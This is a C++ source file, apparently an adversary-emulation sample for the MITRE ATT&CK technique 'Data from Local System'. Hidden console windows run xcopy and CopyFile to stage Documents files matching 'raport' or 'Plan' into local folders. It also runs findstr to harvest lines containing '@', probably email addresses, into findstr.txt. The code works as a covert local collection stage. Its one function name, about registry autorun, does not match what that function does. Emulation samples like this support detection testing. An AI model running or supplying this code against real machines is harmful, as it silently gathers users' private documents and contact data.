---
title: "T1005.Data from Local System"
folder: "11. Collection"
---





#include <windows.h>
#include <fstream>
#include <iostream>
#include <windows.h>
#include <cstring>

void AutorunRegistryBackground4() {

    const char* command = "xcopy \"C:\\Users\\User\\Documents\\*raport*.*\" \"Test\" /s /i /Y";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void copyFiles(const std::string& sourceDir, const std::string& destDir, const std::string& searchString) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((sourceDir + "\\*.*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cout << "No files found!\n";
        return;
    }
    if (!CreateDirectoryA(destDir.c_str(), NULL)) {
        DWORD dwError = GetLastError();
        if (dwError != ERROR_ALREADY_EXISTS) {
            std::cout << "Failed to create destination directory!\n";
            FindClose(hFind);
            return;
        }
    }

    do {
        std::string fileName(findFileData.cFileName);
        if (fileName.find(searchString) != std::string::npos) {
            std::string sourceFile = sourceDir + "\\" + findFileData.cFileName;
            std::string destFile = destDir + "\\" + findFileData.cFileName;
            if (CopyFileA(sourceFile.c_str(), destFile.c_str(), FALSE) == 0) {
                std::cout << "Failed to copy file: " << findFileData.cFileName << "\n";
            }
            else {
                std::cout << "Copied file: " << findFileData.cFileName << "\n";
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}
void RunSystemInfoInBackground() {
    std::ofstream outputFile("findstr.txt");
    const char* command = "findstr /s /i \"@\" \"C:\\Users\\User\\Documents\\*\"";

    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }

    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;

    PROCESS_INFORMATION pi;

    if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }

    CloseHandle(hWritePipe);

    const int BUFFER_SIZE = 4096;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        std::string data(buffer, bytesRead);
        size_t pos = 0;

        while ((pos = data.find("\n", pos)) != std::string::npos) {
            data.erase(pos, 1);
        }

        outputFile.write(data.c_str(), data.size());
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    outputFile.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {


    AutorunRegistryBackground4();
    std::string sourceDir = "C:\\Users\\User\\Documents";
    std::string destDir = "TestAPI";
    std::string searchString = "Plan";
    copyFiles(sourceDir, destDir, searchString);
    RunSystemInfoInBackground();
    return 0;
}